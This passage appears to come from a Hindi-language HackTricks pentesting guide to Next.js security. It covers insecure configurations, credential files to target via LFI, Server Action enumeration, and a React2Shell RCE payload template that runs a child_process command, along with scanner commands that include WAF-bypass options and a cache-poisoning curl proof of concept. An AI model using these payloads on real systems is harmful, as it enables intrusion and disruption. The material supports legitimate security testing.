- **`'*'`:** किसी भी बाहरी स्रोत से इमेज लोड करने की अनुमति देता है, जिसमें अविश्वसनीय या हानिकारक डोमेन्स भी शामिल हैं। हमलावर ऐसे इमेज होस्ट कर सकते हैं जिनमें हानिकारक पेलोड या उपयोगकर्ताओं को गुमराह करने वाली सामग्री हो सकती है।
- एक और समस्या यह हो सकती है कि किसी ऐसे डोमेन्‍न को अनुमति देना **जहाँ कोई भी इमेज अपलोड कर सकता है** (जैसे `raw.githubusercontent.com`)

**हमलावर इसका दुरुपयोग कैसे करते हैं:**

हानिकारक स्रोतों से इमेज इंजेक्ट कर के हमलावर फिशिंग हमले कर सकते हैं, भ्रामक जानकारी दिखा सकते हैं, या इमेज रेंडरिंग लाइब्रेरियों में मौजूद कमजोरियों का शोषण कर सकते हैं।

</details>

<details>

<summary>Environment Variables का खुलासा</summary>

API keys और database credentials जैसी संवेदनशील जानकारी को क्लाइंट के समक्ष उजागर किए बिना सुरक्षित रूप से प्रबंधित करें।

#### a. संवेदनशील वेरिएबल्स का खुलासा

**खराब कॉन्फ़िगरेशन उदाहरण:**
```javascript
// next.config.js

module.exports = {
env: {
SECRET_API_KEY: process.env.SECRET_API_KEY, // Not exposed to the client
NEXT_PUBLIC_API_URL: process.env.NEXT_PUBLIC_API_URL, // Correctly prefixed for exposure to client
},
}
```
**समस्या:**

- **`SECRET_API_KEY`:** बिना `NEXT_PUBLIC_` prefix के, Next.js variables को क्लाइंट पर expose नहीं करता। हालांकि, यदि गलती से prefix कर दिया गया (उदा., `NEXT_PUBLIC_SECRET_API_KEY`), तो यह क्लाइंट-साइड पर accessible हो जाता है।

**हमलावर इसका दुरुपयोग कैसे करते हैं:**

अगर संवेदनशील वेरिएबल्स क्लाइंट पर एक्सपोज़ हो जाते हैं, तो हमलावर उन्हें क्लाइंट-साइड कोड या नेटवर्क अनुरोधों का निरीक्षण करके प्राप्त कर सकते हैं, जिससे उन्हें APIs, डेटाबेस या अन्य सेवाओं तक अनधिकृत पहुँच मिल सकती है।

</details>

<details>

<summary>रिडायरेक्ट्स</summary>

अपने एप्लिकेशन के भीतर URL redirections और rewrites को प्रबंधित करें, यह सुनिश्चित करते हुए कि उपयोगकर्ताओं को सही जगह पर निर्देशित किया जाए बिना open redirect vulnerabilities पेश किए।

#### a. Open Redirect Vulnerability

**खराब कॉन्फ़िगरेशन का उदाहरण:**
```javascript
// next.config.js

module.exports = {
async redirects() {
return [
{
source: "/redirect",
destination: (req) => req.query.url, // Dynamically redirects based on query parameter
permanent: false,
},
]
},
}
```
**समस्या:**

- **डायनामिक गंतव्य:** उपयोगकर्ता किसी भी URL निर्दिष्ट कर सकते हैं, जिससे open redirect attacks संभव होते हैं।
- **यूज़र इनपुट पर भरोसा करना:** उपयोगकर्ताओं द्वारा दिए गए URL पर बिना सत्यापन के redirect करने से phishing, malware distribution, या credential theft हो सकता है।

**हमलावर इसका दुरुपयोग कैसे करते हैं:**

हमलावर ऐसे URLs तैयार कर सकते हैं जो आपके डोमेन से प्रतीत होते हैं लेकिन उपयोगकर्ताओं को हानिकारक साइटों पर redirect कर देते हैं। उदाहरण के लिए:
```bash
https://yourdomain.com/redirect?url=https://malicious-site.com
```
मूल डोमेन पर भरोसा करने वाले उपयोगकर्ता अनजाने में हानिकारक वेबसाइटों पर जा सकते हैं।

</details>

<details>

<summary>Webpack कॉन्फ़िगरेशन</summary>

अपने Next.js एप्लिकेशन के लिए Webpack कॉन्फ़िगरेशन अनुकूलित करें, जो सावधानी से न संभाले जाने पर अनजाने में सुरक्षा कमजोरियाँ ला सकता है।

#### a. संवेदनशील मॉड्यूल का खुलासा

**खराब कॉन्फ़िगरेशन उदाहरण:**
```javascript
// next.config.js

module.exports = {
webpack: (config, { isServer }) => {
if (!isServer) {
config.resolve.alias["@sensitive"] = path.join(__dirname, "secret-folder")
}
return config
},
}
```
**समस्या:**

- **Exposing Sensitive Paths:** संवेदनशील डायरेक्टरीज़ को alias करने और क्लाइंट-साइड एक्सेस की अनुमति देने से गोपनीय जानकारी leak हो सकती है।
- **Bundling Secrets:** यदि संवेदनशील फ़ाइलें क्लाइंट के लिए bundled की जाती हैं, तो उनके कंटेंट source maps के माध्यम से या क्लाइंट-साइड कोड की जाँच करके accessible हो जाते हैं।

**How attackers abuse it:**

Attackers एप्लिकेशन की directory structure तक पहुँच सकते हैं या उसे reconstruct कर सकते हैं, जिससे संभावित रूप से संवेदनशील फाइलें या डेटा मिल सकते हैं और उनका exploiting किया जा सकता है।

</details>

### `pages/_app.js` and `pages/_document.js`

#### **`pages/_app.js`**

**Purpose:** डिफ़ॉल्ट App component को override करता है, जिससे global state, styles, और layout components की सुविधा मिलती है।

**Use Cases:**

- global CSS को inject करना।
- layout wrappers जोड़ना।
- state management libraries को integrate करना।

**Example:**
```jsx
// pages/_app.js
import "../styles/globals.css"

function MyApp({ Component, pageProps }) {
return <Component {...pageProps} />
}

export default MyApp
```
#### **`pages/_document.js`**

**उद्देश्य:** डिफ़ॉल्ट Document को ओवरराइड करता है, जिससे HTML और Body टैग्स को कस्टमाइज़ करने की अनुमति मिलती है।

**उपयोग के मामले:**

- `<html>` या `<body>` टैग्स को संशोधित करना।
- meta टैग्स या कस्टम स्क्रिप्ट्स जोड़ना।
- थर्ड-पार्टी फोंट्स को इंटीग्रेट करना।

**उदाहरण:**
```jsx
// pages/_document.js
import Document, { Html, Head, Main, NextScript } from "next/document"

class MyDocument extends Document {
render() {
return (
<Html lang="en">
<Head>{/* Custom fonts or meta tags */}</Head>
<body>
<Main />
<NextScript />
</body>
</Html>
)
}
}

export default MyDocument
```
### कस्टम सर्वर (वैकल्पिक)

**Purpose:** जबकि Next.js एक बिल्ट-इन सर्वर के साथ आता है, आप उन्नत उपयोग मामलों के लिए कस्टम सर्वर बना सकते हैं, जैसे कस्टम रूटिंग या मौजूदा बैकएंड सेवाओं के साथ एकीकृत करना।

**Note:** कस्टम सर्वर का उपयोग deployment विकल्पों को सीमित कर सकता है, विशेषकर Vercel जैसे प्लेटफार्मों पर जो Next.js के बिल्ट-इन सर्वर के लिए अनुकूलित होते हैं।

**उदाहरण:**
```javascript
// server.js
const express = require("express")
const next = require("next")

const dev = process.env.NODE_ENV !== "production"
const app = next({ dev })
const handle = app.getRequestHandler()

app.prepare().then(() => {
const server = express()

// Custom route
server.get("/a", (req, res) => {
return app.render(req, res, "/a")
})

// Default handler
server.all("*", (req, res) => {
return handle(req, res)
})

server.listen(3000, (err) => {
if (err) throw err
console.log("> Ready on http://localhost:3000")
})
})
```
---

## अतिरिक्त आर्किटेक्चरल और सुरक्षा विचार

### एनवायरनमेंट वेरिएबल्स और कॉन्फ़िगरेशन

**उद्देश्य:** कोडबेस के बाहर संवेदनशील जानकारी और कॉन्फ़िगरेशन सेटिंग्स को प्रबंधित करना।

**सर्वोत्तम प्रथाएँ:**

- **Use `.env` Files:** `.env.local` में API keys जैसे वेरिएबल्स स्टोर करें (version control से बाहर)।
- **Access Variables Securely:** `process.env.VARIABLE_NAME` का उपयोग कर environment variables को सुरक्षित रूप से एक्सेस करें।
- **Never Expose Secrets on the Client:** सुनिश्चित करें कि संवेदनशील वेरिएबल्स केवल server-side पर ही उपयोग हों।

**उदाहरण:**
```javascript
// next.config.js
module.exports = {
env: {
API_KEY: process.env.API_KEY, // Accessible on both client and server
SECRET_KEY: process.env.SECRET_KEY, // Be cautious if accessible on the client
},
}
```
**Note:** सर्वर-साइड तक वेरिएबल्स को सीमित करने के लिए, उन्हें `env` ऑब्जेक्ट में न रखें; क्लाइंट पर एक्सपोज़र के लिए उन्हें `NEXT_PUBLIC_` से प्रीफ़िक्स करें।

### Useful server artifacts to target via LFI/download endpoints

अगर आप किसी Next.js ऐप में path traversal या download API पाते हैं, तो उन compiled artifacts को लक्षित करें जो server-side secrets और auth logic को leak करते हैं:

- `.env` / `.env.local` for session secrets and provider credentials.
- `.next/routes-manifest.json` and `.next/build-manifest.json` for a complete route list.
- `.next/server/pages/api/auth/[...nextauth].js` to recover the compiled NextAuth configuration (often contains fallback passwords when `process.env` values are unset).
- `next.config.js` / `next.config.mjs` to review rewrites, redirects and middleware routing.

### Authentication and Authorization

**Approach:**

- **Session-Based Authentication:** यूज़र सेशंस को मैनेज करने के लिए cookies का उपयोग करें।
- **Token-Based Authentication:** stateless authentication के लिए JWTs को implement करें।
- **Third-Party Providers:** libraries जैसे `next-auth` का उपयोग करके OAuth providers (e.g., Google, GitHub) के साथ integrate करें।

**Security Practices:**

- **Secure Cookies:** `HttpOnly`, `Secure`, और `SameSite` attributes को सेट करें।
- **Password Hashing:** स्टोर करने से पहले हमेशा passwords को hash करें।
- **Input Validation:** inputs को validate और sanitize करके injection attacks को रोकें।

**Example:**
```javascript
// pages/api/login.js
import { sign } from "jsonwebtoken"
import { serialize } from "cookie"

export default async function handler(req, res) {
const { username, password } = req.body

// Validate user credentials
if (username === "admin" && password === "password") {
const token = sign({ username }, process.env.JWT_SECRET, {
expiresIn: "1h",
})
res.setHeader(
"Set-Cookie",
serialize("auth", token, {
path: "/",
httpOnly: true,
secure: true,
sameSite: "strict",
})
)
res.status(200).json({ message: "Logged in" })
} else {
res.status(401).json({ error: "Invalid credentials" })
}
}
```
### प्रदर्शन अनुकूलन

**रणनीतियाँ:**

- **छवि अनुकूलन:** स्वचालित छवि अनुकूलन के लिए Next.js के `next/image` component का उपयोग करें।
- **कोड विभाजन:** डायनामिक imports का उपयोग करके कोड विभाजित करें और प्रारंभिक लोड समय कम करें।
- **कैशिंग:** API responses और static assets के लिए कैशिंग रणनीतियाँ लागू करें।
- **Lazy Loading:** components या assets को तभी लोड करें जब उनकी आवश्यकता हो।

**उदाहरण:**
```jsx
// Dynamic Import with Code Splitting
import dynamic from "next/dynamic"

const HeavyComponent = dynamic(() => import("../components/HeavyComponent"), {
loading: () => <p>Loading...</p>,
})
```
## Next.js Server Actions Enumeration (hash to function name via source maps)

आधुनिक Next.js “Server Actions” का उपयोग करता है जो सर्वर पर execute होते हैं लेकिन क्लाइंट से invoke किए जाते हैं। Production में ये invocations opaque होते हैं: सभी POSTs एक सामान्य endpoint पर जाते हैं और इन्हें एक build-specific hash के द्वारा अलग किया जाता है जो `Next-Action` header में भेजा जाता है। उदाहरण:
```http
POST /
Next-Action: a9f8e2b4c7d1...
```
जब `productionBrowserSourceMaps` सक्षम होता है, minified JS chunks में `createServerReference(...)` कॉल्स होती हैं जो पर्याप्त structure (साथ ही associated source maps) को leak करती हैं ताकि action hash और मूल function name के बीच mapping recover की जा सके। इससे आप `Next-Action` में देखे गए hashes को concrete targets जैसे `deleteUserAccount()` या `exportFinancialData()` में translate कर सकते हैं।

### निकालने का तरीका (regex on minified JS + optional source maps)

डाउनलोड किए गए JS chunks में `createServerReference` की खोज करें और hash और function/source symbol निकालें। दो उपयोगी पैटर्न:
```regex
# Strict pattern for standard minification
createServerReference\)"([a-f0-9]{40,})",\w+\.callServer,void 0,\w+\.findSourceMapURL,"([^"]+)"\)

# Flexible pattern handling various minification styles
createServerReference[^\"]*"([a-f0-9]{40,})"[^\"]*"([^"]+)"\s*\)
```
- समूह 1: server action hash (40+ hex chars)
- समूह 2: symbol या path जो मौजूद होने पर source map के माध्यम से मूल function तक resolve किया जा सके

If the script advertises a source map (trailer comment `//# sourceMappingURL=<...>.map`), fetch it and resolve the symbol/path to the original function name.

### व्यावहारिक कार्यप्रवाह

- ब्राउज़ करते समय निष्क्रिय खोज: `Next-Action` headers और JS chunk URLs वाले requests को कैप्चर करें।
- संदर्भित JS bundles और साथ की `*.map` फाइलें (जब मौजूद हों) fetch करें।
- ऊपर दिए गए regex को चलाकर hash↔name डिक्शनरी बनाएं।
- उस डिक्शनरी का उपयोग करके परीक्षण लक्षित करें:
  - नाम-आधारित triage (उदा., `transferFunds`, `exportFinancialData`)।
  - function name के आधार पर builds में कवरेज ट्रैक करें (hashes builds के साथ rotate होते हैं)।

### छिपे हुए actions का परीक्षण (template-based request)

Take a valid POST observed in-proxy as a template and swap the `Next-Action` value to target another discovered action:
```http
# Before
Next-Action: a9f8e2b4c7d1

# After
Next-Action: b7e3f9a2d8c5
```
Repeater में replay करके उन otherwise unreachable actions के authorization, input validation और business logic का परीक्षण करें।

### Burp स्वचालन

- NextjsServerActionAnalyzer (Burp extension) ऊपर बताए गए कार्यों को Burp में स्वचालित करता है:
- JS chunks के लिए proxy history को खंगालता है, `createServerReference(...)` एंट्रीज़ निकालता है, और जब उपलब्ध हों तो source maps को पार्स करता है।
- searchable hash↔function-name dictionary बनाए रखता है और function name के आधार पर builds में डुप्लीकेट्स हटाता है।
- एक वैध template POST खोज सकता है और target action’s hash को बदलकर भेजने के लिए तैयार Repeater tab खोल सकता है।
- Repo: https://github.com/Adversis/NextjsServerActionAnalyzer

### नोट्स और सीमाएँ

- Bundles/source maps से नाम पुनर्प्राप्त करने के लिए production में `productionBrowserSourceMaps` सक्षम होना आवश्यक है।
- Function-name disclosure स्वयं में vulnerability नहीं है; इसे खोज को निर्देशित करने और प्रत्येक action की authorization की जाँच करने के लिए उपयोग करें।

### React Server Components Flight protocol deserialization RCE (CVE-2025-55182)

Next.js App Router deployments जो Server Actions को `react-server-dom-webpack` **19.0.0–19.2.0 (Next.js 15.x/16.x)** पर एक्सपोज़ करते हैं, उनमें **Flight** chunk deserialization के दौरान एक गंभीर server-side prototype pollution होती है। Flight payload के भीतर `$` references को तैयार करके एक attacker polluted prototypes से arbitrary JavaScript execution तक pivot कर सकता है और फिर Node.js process के अंदर OS command execution तक पहुँच सकता है।

{{#ref}}
../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/README.md
{{#endref}}

#### Flight chunks में Attack chain

1. **Prototype pollution primitive:** `"then": "$1:__proto__:then"` सेट करें ताकि resolver `Object.prototype` पर एक `then` function लिखे। बाद में प्रोसेस किए गए किसी भी plain object से thenable बन जाता है, जिससे attacker RSC internals के अंदर async control flow को प्रभावित कर सकता है।
2. **Rebinding to the global `Function` constructor:** `_response._formData.get` को `"$1:constructor:constructor"` पर पॉइंट करें। resolution के दौरान, `object.constructor` → `Object`, और `Object.constructor` → `Function`, इसलिए भविष्य में `_formData.get()` कॉल वास्तव में `Function(...)` को execute करते हैं।
3. **Code execution via `_prefix`:** JavaScript स्रोत `_response._prefix` में रखें। जब polluted `_formData.get` invoke होता है, तो framework `Function(_prefix)(...)` को evaluate करता है, इसलिए injected JS `require('child_process').exec()` या कोई अन्य Node primitive चला सकता है।

#### Payload खाका
```json
{
"then": "$1:__proto__:then",
"status": "resolved_model",
"reason": -1,
"value": "{\"then\":\"$B1337\"}",
"_response": {
"_prefix": "require('child_process').exec('id')",
"_chunks": "$Q2",
"_formData": { "get": "$1:constructor:constructor" }
}
}
```
#### React Server Function एक्सपोजर का मानचित्रण

React Server Functions (RSF) वे कोई भी functions हैं जिनमें 'use server'; directive शामिल होता है। हर form action, mutation, या fetch helper जो उन functions में से किसी एक से जुड़ा होता है, वह एक RSC Flight endpoint बन जाता है जो हमलावर द्वारा प्रदान किए गए payloads को आसानी से deserialize कर लेता है। React2Shell assessments से निकले उपयोगी recon कदम:

- **Static inventory:** directive को ढूँढें ताकि समझ सकें कि framework द्वारा कितने RSFs स्वतः expose किए जा रहे हैं।
```bash
rg -n "'use server';" -g"*.{js,ts,jsx,tsx}" app/
```
- **App Router defaults:** `create-next-app` डिफ़ॉल्ट रूप से App Router + `app/` directory को सक्षम करता है, जो चुपचाप हर रूट को एक RSC-capable एंडपॉइंट में बदल देता है। App Router assets जैसे `/_next/static/chunks/app/` या वे responses जो Flight chunks को `text/x-component` पर stream करते हैं, इंटरनेट-फेसिंग फिंगरप्रिंट्स के रूप में मजबूत संकेत हैं।
- **Implicitly vulnerable RSC deployments:** React की अपनी advisory बताती है कि RSC runtime भेजने वाले apps exploitable हो सकते हैं **यहाँ तक कि explicit RSFs के बिना भी**, इसलिए `react-server-dom-*` 19.0.0–19.2.0 का उपयोग करने वाले किसी भी build को संदिग्ध मानें।
- **Other frameworks bundling RSC:** Vite RSC, Parcel RSC, React Router RSC preview, RedwoodSDK, Waku, आदि वही serializer reuse करते हैं और वही remote attack surface inherit करते हैं जब तक वे patched React builds embed नहीं करते।

#### Version coverage (React2Shell)

- `react-server-dom-webpack`, `react-server-dom-parcel`, `react-server-dom-turbopack`: **vulnerable** in 19.0.0, 19.1.0–19.1.1 and 19.2.0; **patched** in 19.0.1, 19.1.2 and 19.2.1 respectively.
- **Next.js stable:** App Router releases 15.0.0–16.0.6 vulnerable RSC stack को embed करते हैं। Patch trains 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7 में fixed deps शामिल हैं, इसलिए उन संस्करणों से नीचे कोई भी build high-value माना जाना चाहिए।
- **Next.js canary:** `14.3.0-canary.77+` भी buggy runtime भेजता है और वर्तमान में patched canary drops की कमी है, जिससे वे फिंगरप्रिंट्स मजबूत exploitation candidates बन जाते हैं।

#### Remote detection oracle

Assetnote’s [`react2shell-scanner`](https://github.com/assetnote/react2shell-scanner) उम्मीदवार paths पर एक crafted multipart Flight request भेजता है और server-side व्यवहार को मॉनिटर करता है:

- **Default mode** एक deterministic RCE payload निष्पादित करता है (math operation `X-Action-Redirect` के माध्यम से परावर्तित) जो code execution को प्रमाणित करता है।
- **`--safe-check` mode** जानबूझकर Flight message को malformed करता है ताकि patched servers `200/400` लौटाएँ, जबकि vulnerable targets `HTTP/500` responses उत्सर्जित करते हैं जिनके body में `E{"digest"` substring होता है। यह `(500 + digest)` जोड़ी वर्तमान में defenders द्वारा प्रकाशित सबसे भरोसेमंद remote oracle है।
- Built-in `--waf-bypass`, `--vercel-waf-bypass`, and `--windows` switches payload layout को समायोजित करते हैं, junk जोड़ते हैं, या OS commands को स्वैप करते हैं ताकि आप वास्तविक Internet assets को probe कर सकें।
```bash
python3 scanner.py -u https://target.tld --path /app/api/submit --safe-check
python3 scanner.py -l hosts.txt -t 20 --waf-bypass -o vulnerable.json
```
### अन्य हाल के App Router मुद्दे (late 2025)

1. **RSC DoS & source disclosure (CVE-2025-55184 / CVE-2025-67779 / CVE-2025-55183)** – गलत स्वरूप वाले Flight payloads RSC resolver को अनंत लूप में चला सकते हैं (pre-auth DoS) या compiled Server Function code को अन्य क्रियाओं के लिए serialization पर मजबूर कर सकते हैं। App Router builds ≥13.3 प्रभावित हैं जब तक patch न लगाया जाए; 15.0.x–16.0.x को upstream advisory से specific patch lines चाहिए। सामान्य Server Action path को reuse करें लेकिन abusive `$` references के साथ `text/x-component` body stream करें। CDN के पीछे हंग connection cache timeouts के कारण खुला रहता है, जिससे DoS सस्ता पड़ता है।
- Triage टिप: Unpatched targets malformed Flight payloads के बाद `500` और `E{"digest"` लौटाते हैं; patched builds `400/200` लौटाते हैं। किसी भी endpoint को टेस्ट करें जो पहले से Flight chunks stream कर रहा हो (देखें `Next-Action` headers या `text/x-component` responses) और बदला हुआ payload replay करें।

2. **RSC cache poisoning (CVE-2025-49005, App Router 15.3.0–15.3.2)** – missing `Vary` ने `Accept: text/x-component` response को cache होने और HTML की अपेक्षा करने वाले browsers को serve होने की अनुमति दी। एक single priming request पेज को raw RSC payloads से बदल सकती है। PoC flow:
```bash
# Prime CDN with an RSC response
curl -k -H "Accept: text/x-component" "https://target/app/dashboard" > /dev/null
# Immediately fetch without Accept (victim view)
curl -k "https://target/app/dashboard" | head
```
यदि दूसरी response HTML की बजाय JSON Flight data लौटाती है, तो रूट poisonable है। परीक्षण के बाद cache को purge करें।

## References

- [Pentesting Next.js Server Actions — A Burp Extension for Hash-to-Function Mapping](https://www.adversis.io/blogs/pentesting-next-js-server-actions)
- [NextjsServerActionAnalyzer (Burp extension)](https://github.com/Adversis/NextjsServerActionAnalyzer)
- [CVE-2025-55182 React Server Components Remote Code Execution Exploit Tool](https://github.com/Spritualkb/CVE-2025-55182-exp)
- [CVE-2025-55182 & CVE-2025-66478 React2Shell – All You Need to Know](https://jfrog.com/blog/2025-55182-and-2025-66478-react2shell-all-you-need-to-know/)
- [0xdf – HTB Previous (Next.js middleware bypass, static export recon, NextAuth config leak)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [assetnote/react2shell-scanner](https://github.com/assetnote/react2shell-scanner)
- [Next.js Security Update: December 11, 2025 (CVE-2025-55183/55184/67779)](https://nextjs.org/blog/security-update-2025-12-11)
- [GHSA-r2fc-ccr8-96c4 / CVE-2025-49005: App Router cache poisoning](https://github.com/advisories/GHSA-r2fc-ccr8-96c4)

{{#include ../../banners/hacktricks-training.md}}
